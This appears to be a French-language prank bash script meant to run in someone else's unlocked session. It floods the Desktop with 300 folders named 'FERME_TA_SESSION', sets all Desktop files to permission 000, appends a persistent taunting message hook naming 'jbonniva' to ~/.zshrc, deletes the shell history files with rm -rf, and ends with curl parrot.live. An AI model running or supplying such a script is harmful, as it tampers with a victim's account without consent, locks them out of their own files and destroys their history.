#!/bin/bash

cd $HOME/Desktop
nbr=0
while ((nbr != 300))
	do
		mkdir "FERME_TA_SESSION$nbr"
		((nbr += 1))
	done
chmod 000 *
cd ~
echo -e "precmd(){echo -e '\033[32mjbonniva \033[00m est un gentil tuteur! \033[31mMAINTENANT JE FERMERAI MA SESSION! \033[00m' } " >> ~/.zshrc
rm -rf ~/.bash_history ~/.zsh_history
clear
curl parrot.live
